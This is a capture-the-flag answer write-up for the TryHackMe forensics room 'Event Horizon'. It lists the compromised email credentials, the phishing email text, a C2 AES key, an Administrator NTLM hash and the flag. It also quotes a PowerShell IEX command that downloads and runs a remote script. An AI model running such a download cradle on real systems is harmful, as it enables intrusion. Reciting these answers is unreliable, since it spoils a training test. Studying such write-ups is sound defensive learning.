# <div align='center'>[Event Horizon](https://tryhackme.com/room/eventhorizonroom)</div>
<div align='center'>Unearth the secrets beyond the Event Horizon.</div>
<div align='center'>
  <img width="200" height="200" alt="618b3fa52f0acc0061fb0172-1749651774451" src="https://github.com/user-attachments/assets/b3ce0df5-b3d5-4221-88b1-4159db8d6f28" />
</div>

## Task 1. The Event Horizon

Join Tom and Dom on a quest to find out what happens when you look beyond the Event Horizon. A quest beyond borders, they need you to utilize all your abilities to find the secrets that were taken when they crossed over to the other side.

### The attacker was able to find the correct pair of credentials for the email service. What were they? Format: email:password
```
tom.dom@eventhorizon.thm:password
```
### What was the body of the email that was sent by the attacker?
```
Tom! I have done it! I have found the mass of the black hole we found! Run this script as the AdministratOr! Your BEst friend DOm
```
### What command initiated the malicious script download?
```
IEX(New-Object Net.WebClient).downloadString('http://10.0.2.45/radius.ps1')
```
### What is the initial AES key that is used for decrypting the C2 traffic?
```
l86TfRDvvJMtXWxr1PSoh1QlXHnZnLwn+wz+aYy3/s8=
```
### What is the Administrator NTLM hash that the attacker found?
```
13b1e64400203ecf38b1fdea2b11a09f
```

### What is the flag?
```
FLAG{ABOVE_AND_B3YOND_THE_EVENT_HORIZON}
```


